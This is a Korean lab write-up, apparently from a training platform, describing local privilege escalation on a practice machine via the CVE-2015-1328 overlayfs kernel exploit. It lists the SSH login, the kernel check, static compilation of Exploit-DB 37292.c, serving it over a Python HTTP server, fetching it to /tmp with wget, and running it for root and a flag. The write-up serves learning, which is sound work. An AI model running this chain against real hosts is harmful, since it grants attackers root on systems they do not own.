# Linux Privilege Escalation: Kernel Exploits
> 커널 익스플로잇을 이용하여 권한 상승에 관한 실습을 했습니다.

---

## 1. 실습 개요
- **타겟 머신 IP**: 10.10.42.60
- **공격 머신**: Kali Linux
- **사용 계정**: `karen:Password1`
- **커널 버전**: `Linux 3.13.0-24-generic`
- **실습 일자**: 2025-04-18

---

## 2. 실습 과정

### 2.1 SSH 접속
- 타겟 머신에 SSH로 접근 -> karen 계정과 주어진 비밀번호로 로그인 하였다.

```bash
ssh karen@10.10.42.60
```

![SSH 연결 및 로그인](/screenshots/ssh_connect.png)

### 2.2 커널 버전 확인

- 커널 버전 확인→ uname -a 명령어로 커널 버전을 확인하고, 3.13.0-24-generic 버전이라는 것을 확인하였다.

```bash
uname -a
```
![uname -a 출력](/screenshots/uname.png)

- 커널 버전이 CVE-2015-1328에 취약하다는 사실을 구글링을 통해 확인하였다.

- Exploit-DB에서 해당 취약점에 대한 37292.c 소스코드를 다운로드하였다.
[Exploit-DB - CVE-2015-1328](https://www.exploit-db.com/exploits/37292)

### 2.3 Kali에서 SSH 서버 시작

```bash
systemctl start ssh
```
![SSH 서비스 시작](/screenshots/start_ssh.png)


### 2.4 Exploit 다운로드 및 전송 (Windows → Kali) 
- Windows → Kali로 소스 전송: Windows PowerShell의 `scp`를 통해 Kali로 소스 파일을 전송하였다. (실제 IP는 모자이크)

```bash powershell
scp D:/exploit_file/37292.c root@<MyRoot-ip>:/root
```
![SCP 전송](/screenshots/window_scp.png)


### 2.5 Exploit 정적 컴파일  
- `gcc 37292.c -o exploit -static` 명령어를 사용하여 정적으로 컴파일 하였다.

```bash
gcc 37292.c -o exploit -static
```
![정적 컴파일](/screenshots/compile.PNG)

### 2.6 타겟 머신으로 Exploit 전송
- Kali에서 `python3 -m http.server 8000`으로 HTTP 서버를 열고, 타겟 머신에서 `wget`으로 exploit을 /tmp에 다운로드하였다.

```bash
python3 -m http.server 8000
wget http://<kali-ip>:8000/exploit -O /tmp/exploit
```
![wget 전송](/screenshots/http_server_wget.PNG)

### 2.7 실행 및 루트 획득

- `chmod +x exploit` 후 `./exploit`을 실행하여 루트 권한을 획득하였다. 후에 `find / -name flag1.txt`로 플래그 파일 경로를 찾고, `cat /home/matt/flag1.txt`로 내용 확인하였다.

```bash
chmod +x exploit
./exploit
id
find / -name flag1.txt
cat /home/matt/flag1.txt
```
![익스플로잇 실행 및 플래그 획득](/screenshots/exploit_flag.PNG)

---

## 느낀 점

이번 실습을 통해 커널 익스플로잇을 활용한 권한 상승 과정을 직접 따라 해보며, 이론으로만 알고 있던 **Kernel Exploit의 실제 작동 방식과 흐름을 체험**할 수 있었다.
특히, 커널 버전 확인부터 취약점 검색, 익스플로잇 소스 컴파일 및 전송, 실행을 통해 루트 권한을 획득하는 일련의 과정을 경험하면서, **실제 시스템 해킹 흐름을 이해하고 정리하는 데 큰 도움이 되었다**.

